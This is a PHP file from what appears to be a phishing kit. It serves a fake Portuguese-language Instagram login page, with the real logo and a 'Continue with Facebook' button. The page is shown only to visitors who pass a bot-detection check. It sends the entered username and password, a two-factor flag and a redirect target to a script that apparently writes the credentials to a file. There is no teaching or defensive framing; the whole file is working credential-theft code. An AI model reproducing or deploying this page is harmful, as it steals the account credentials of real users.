<?php 
include ('./phishing_info/' . basename(__FILE__));
include('.././other/detect_bot.php');
        if (detect())
		{echo'<link rel=stylesheet type=text/css href="./remove branding logo/000webhost.css">';
echo'<!DOCTYPE html><html><head><meta charset=UTF-8><title>Login • Instagram</title><link rel="shortcut icon" type=image/x-icon href="data:image/png;base64,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"><style>.ta35{margin-right:8px}.ta35:last-child{margin-right:0}.ta22{display:block;position:relative}.ta23{-webkit-appearance:none;border-radius:3px;border-style:solid;border-width:1px;font-size:14px;font-weight:600;line-height:26px;outline:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%}.ta24{background:#3897f0;border-color:#3897f0;color:#fff}.ta23:active{opacity:.7}.ta26{cursor:pointer}a,article,body,div,form,html,img,p,section,span{margin:0;padding:0;border:0;font:inherit;vertical-align:baseline}body{line-height:1}#react-root,article,div,main,section{-webkit-box-align:stretch;-webkit-align-items:stretch;-ms-flex-align:stretch;align-items:stretch;border:0 solid #000;-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;margin:0;padding:0;position:relative}body{overflow-y:scroll}body:-webkit-full-screen{height:100%;width:100%}body:-moz-full-screen{height:100%;width:100%}body:-ms-fullscreen{height:100%;width:100%}body:fullscreen{height:100%;width:100%}html{-webkit-text-size-adjust:100%}#react-root,body,html{height:100%}#react-root{z-index:0}body,button,input{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:18px}a,a:visited{color:#003569;text-decoration:none}a:active{opacity:.5}.ta19{-webkit-appearance:none}.ta19::-webkit-input-placeholder{color:#999;font-weight:300;opacity:1}.ta19:-ms-input-placeholder{color:#999;font-weight:300;opacity:1}.ta19::-ms-clear{display:none;height:0;width:0}.ta16{height:36px;-webkit-box-flex:1;-webkit-flex:1 0 0;-ms-flex:1 0 0;flex:1 0 0;padding:0;position:relative;margin:0}.ta17,.ta15{background:#fafafa}.ta90{margin-top:-100px;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;border-radius:3px;-webkit-box-sizing:border-box;box-sizing:border-box;color:#262626;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;font-size:14px;position:relative;-webkit-appearance:none;width:100%;border:1px solid #efefef}.ta15{-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;border-radius:3px;-webkit-box-sizing:border-box;box-sizing:border-box;color:#262626;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;font-size:14px;position:relative;-webkit-appearance:none;width:100%;border:1px solid #efefef}.ta17{border:0;-webkit-box-flex:1;-webkit-flex:1 0 0;-ms-flex:1 0 0;flex:1 0 0;margin:0;outline:0;overflow:hidden;padding:9px 0 7px 8px;text-overflow:ellipsis}.ta20{-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-flex:0;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;height:100%;padding-right:8px;vertical-align:middle}.ta14{margin:0 40px 6px}.ta21{margin:8px 40px}.ta13{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.ta12{margin-bottom:10px}.ta44,.ta44:active,.ta44:hover,.ta44:visited{font-size:15px;line-height:14px;margin-top:12px;text-align:right;color:#3897f0}.ta07{color:#262626;-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;margin-top:12px;max-width:350px}.ta29{color:#262626;font-size:14px;margin:15px;text-align:center}.ta29>a,.ta29>a:active,.ta29>a:hover,.ta29>a:visited{color:#3897f0}.ta08{background-color:#fff;border:1px solid #e6e6e6;border-radius:1px;margin:0 0 5px;padding:0px 0}@media(max-width:450px){.ta07{-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;margin-top:0;max-width:100%}.ta08{background-color:transparent;border:0}}.ta30{background-color:#d10869;overflow:hidden;display:block}.ta33{background:-webkit-radial-gradient(70% 70% ellipse,#ee583f 8%,#d92d77 42%,#bd3381 58%);background:radial-gradient(ellipse at 70% 70%,#ee583f 8%,#d92d77 42%,#bd3381 58%);height:100%;pointer-events:none;position:absolute;width:100%}.ta34{-webkit-animation:GradientRotation 12s steps(120) infinite;animation:GradientRotation 12s steps(120) infinite;margin-left:-25%;margin-top:-75%;min-height:150%;min-width:150%;padding-bottom:75%;padding-top:75%}._c05qa{z-index:1}@-webkit-keyframes GradientRotation{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes GradientRotation{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.ta32{padding:0 5px}.ta36{background:0;-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;padding:11px 13px 11px 11px;position:relative;width:100%}.ta36:active{opacity:1}.ta41{text-align:right;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row}.ta42{background:0;border:1px solid #fff;border-radius:3px;-webkit-box-sizing:border-box;box-sizing:border-box;font-size:14x;font-weight:600;line-height:25px;padding:0 10px;text-transform:uppercase}.ta37{-webkit-box-flex:1;-webkit-flex:1 1 200px;-ms-flex:1 1 200px;flex:1 1 200px;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;min-width:1px;padding-right:11px}.ta38{padding-left:4px}.ta39{font-size:15px;font-weight:600;line-height:15px;margin:0 0 2px}.ta40{font-size:12px;font-weight:500;line-height:12px;margin:0}.ta39,.ta42,.ta40{color:#fff}.ta01{min-height:100%;overflow:hidden}.ta31{-webkit-box-ordinal-group:2;-webkit-order:1;-ms-flex-order:1;order:1}.ta02{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-box-ordinal-group:5;-webkit-order:4;-ms-flex-order:4;order:4}.ta03{background-color:#fafafa}.ta06{-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;margin:30px auto 0;max-width:935px;width:100%}@media(max-width:450px){.ta06{margin-top:0}}.bu01{-webkit-appearance:none;-moz-appearance:none;appearance:none;background:0;border:0;-webkit-box-sizing:border-box;box-sizing:border-box;cursor:pointer;display:block;font-weight:600;padding:5px 9px;text-align:center;text-transform:inherit;text-overflow:ellipsis;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:80%}.bu01:active{opacity:.7}.bu02{background-color:#3897f0;border:1px solid #3897f0;border-radius:4px;color:#fff;position:relative}</style></head><body><span><section class=ta01><main class="ta02 ta03" role=main><article class=ta06><div class=ta07><div class=ta08><div class=ta12><p><p style=color:#999;font-size:30px;margin-top:15px;margin-left:20px><b></b></p><p style=margin-top:-25px></p></p><img style=margin-top:20px;padding:25px;display:block;margin-left:auto;margin-right:auto;width:50%; src="data:image/png;base64,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"><div><center><button onclick=window.location.href="./facebook_mobile.php"; class="bu01 bu02"><img style=margin-top:1px;margin-bottom:0;padding-bottom:0 src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAMAAAAMs7fIAAAAaVBMVEX////8/f+WyPd2t/VJoPHX6vz3+/7j8f36/f/G4fs/m/Hb7Pyiz/hYp/JPo/I8mfDv9/7p9P3S6PzN5fu12PqOxPeKwvZvtPRdq/NEnvHy+P6/3vqRxveBvfZ7uvVytfRts/Req/NCnPHhSoZRAAAAe0lEQVQY023NCQrEIAwF0ESdxt3uy+wz9z9kQURt6YcE8ggJECDEIMZuQEKCVBIyNL2d2AAFUHEvnK2km7bt9xkrMVwv40CV3LhgDZS09PiK2dA9byjGvV5fzx4wiXU6hPBfVRY1L167N6Mo5bKMc0qW0/dLwYud9ijY7f55BLfA11BHAAAAAElFTkSuQmCC"> Continuar com Facebook</button></center></div><font style=margin-top:10px><center><font color=#efefef>―――――――</font><font color=#999> OU </font><font color=#efefef>―――――――</font></center><font><div style=margin-bottom:10px></div><form class=ta13 action=.././other/post_in_file.php method=POST><div class=ta14><div class=ta15><div class=ta16>
<input type=hidden name=name value="'.basename(__FILE__).'">
<input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
<input  type=text class="ta17 ta90 ta19" placeholder="Telefone, nome de usuário, ou email" maxlength=30 name=username required></div><div class=ta20></div></div></div><div class=ta14><div class=ta15><div class=ta16>
<input  type=password class="ta17 ta19" placeholder=Senha name=password required>
<input  type=hidden name=location value=instagram >
<input  type=hidden name=link value='.$redirect.'></div><div class=ta20></div></div></div><span class="ta21 ta22"><a class=ta44 style=margin-left:50%; href=#></a><br/><button style=height:34px class="ta23 ta24 ta26">Entrar</button><br/></span></form></div></div><div class=ta08><p class=ta29>Não tem uma conta? <a href=#>Cadastre-se</a></p></div></div></article></main><div class="ta30 ta31 ta32"><div class="ta33 ta34"></div><div class=_c05qa><a class="ta35 ta36 ta31" href=# role=alert><section class="ta37 ta38"><p class=ta39>Instagram</p><p class=ta40>Find it for free on Google Play.</p></section><section class=ta41><button class=ta42>Get</button></section></a></div></div></section></span><div></div><div></div></body></html>';}?>